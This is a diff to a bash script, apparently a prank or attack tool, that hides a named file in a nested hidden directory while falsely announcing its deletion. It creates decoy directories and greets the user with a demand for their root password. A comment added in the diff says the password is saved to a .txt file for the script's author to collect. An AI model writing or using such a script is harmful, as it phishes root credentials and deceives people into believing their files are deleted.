@@ -1,4 +1,14 @@
+#makes sure the file is used correctly
+if [ "$#" -ne 1 ] 
+then
+	echo "USAGE ./tool.sh FILE-TO-CORRUPT"
+	exit
+fi	
+
+
 WRONG_ANSWER(){
+#function to call whenever user input is wrong
+#will move files and make false directories
         for i in {1..20}
         do
                 echo "WRONG ANSWER"
@@ -6,7 +16,7 @@ WRONG_ANSWER(){
 		echo " File has been deleted " 
         done
 
-	mv test01 .loser
+	mv $1 .loser
 	mkdir loser1 
 	mkdir loser2
 	mkdir winner1
@@ -14,7 +24,7 @@ WRONG_ANSWER(){
 	mkdir .kid
 	mv .loser .kid				
 } 
-
+		#prompts user, if the user wants to give you the root password, then it will redirect it into a .txt file for you to grab
                 echo "Hello $USER" 
                 echo "Looks like you found me, but first you must make a choice"
                 echo "Give me your root password, or answer a series of challenges to retrieve your file"
